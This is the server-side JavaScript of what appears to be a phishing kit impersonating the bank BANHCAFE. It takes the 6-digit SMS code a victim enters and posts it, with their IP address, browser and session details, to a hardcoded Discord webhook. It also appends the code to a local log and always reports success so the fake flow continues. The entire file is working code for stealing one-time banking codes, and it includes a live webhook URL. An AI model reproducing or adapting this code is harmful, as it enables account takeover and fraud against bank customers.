// procesar_sms.js
import express from "express";
import session from "express-session";
import fetch from "node-fetch";
import fs from "fs";
import path from "path";
import crypto from "crypto";

const app = express();
const PORT = 3000;

// Middleware para leer formularios tipo POST
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Configuración de sesiones
app.use(
  session({
    secret: "clave_super_segura",
    resave: false,
    saveUninitialized: true,
  })
);

// Ruta para procesar el SMS/token
app.post("/procesar_sms", async (req, res) => {
  const { codigo = "" } = req.body;

  // Validar que tenga 6 dígitos
  if (!/^\d{6}$/.test(codigo)) {
    return res.json({ exito: false, mensaje: "Token inválido" });
  }

  // Si no hay sesión, crear una nueva
  if (!req.session.session_token) {
    req.session.session_token = crypto.randomBytes(16).toString("hex");
    req.session.session_start = new Date().toISOString();
    req.session.ip_address = getClientIP(req);
    req.session.user_agent = req.headers["user-agent"] || "";
    req.session.token_verified = false;
  }

  // Obtener información del cliente
  const ip = getClientIP(req);
  const user_agent = req.headers["user-agent"] || "";
  const timestamp = new Date().toISOString();
  const referer = req.headers["referer"] || "Directo";

  // Mensaje para Discord
  let mensaje = `**✅ Verificación Token BANHCAFE**\n`;
  mensaje += `🔐 **Sesión:** \`${req.session.session_token}\`\n`;
  mensaje += `⏰ **Inicio sesión:** ${req.session.session_start}\n`;
  mensaje += `🕒 **Verificación token:** ${timestamp}\n`;
  mensaje += `🌐 **IP:** \`${ip}\`\n`;
  mensaje += `🔍 **Navegador:** ${user_agent.substring(0, 50)}\n`;
  mensaje += `📎 **Referer:** ${referer}\n`;
  mensaje += `🔢 **Token Ingresado:** \`${codigo}\`\n`;
  mensaje += `📊 **Estado:** VERIFICADO CORRECTAMENTE\n`;
  mensaje += `────────────────────`;

  // Webhook de Discord
  const webhook_url =
    "https://discord.com/api/webhooks/1445845502422810736/KSSZhDRTjxaf9IREkfU3E5npUYOkayGwJ7A7CdGwaPA8eLAK9JDb6PhjwR9PI6MtbACg";

  try {
    await fetch(webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: mensaje }),
    });
  } catch (err) {
    console.error("Error al enviar a Discord:", err);
  }

  // Guardar en archivo log
  logTokenVerification(req.session.session_token, codigo, ip);

  // Marcar como verificado en la sesión
  req.session.token_verified = true;
  req.session.token_verified_at = timestamp;

  // Respuesta siempre "exitosa"
  res.json({
    exito: true,
    mensaje: "Token verificado correctamente",
    redirect: "index2.html",
  });
});

// Si no es POST, redirige al index
app.get("*", (req, res) => {
  res.redirect("/index.html");
});

// Función para obtener la IP real
function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.connection.remoteAddress ||
    "IP desconocida"
  );
}

// Guardar tokens verificados en archivo log
function logTokenVerification(sessionToken, token, ip) {
  const logFile = path.join(process.cwd(), "tokens_verificados.log");
  const timestamp = new Date().toISOString();
  const logEntry = `[${timestamp}] SESION: ${sessionToken} | IP: ${ip} | TOKEN: ${token} | ESTADO: VERIFICADO\n`;

  fs.appendFileSync(logFile, logEntry, { encoding: "utf8" });
}

// Leer tokens verificados (similar a admin_tokens.php)
function getVerifiedTokens() {
  const logFile = path.join(process.cwd(), "tokens_verificados.log");
  if (!fs.existsSync(logFile)) return [];
  const content = fs.readFileSync(logFile, "utf8");
  return content.split("\n").filter((line) => line.trim() !== "");
}

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
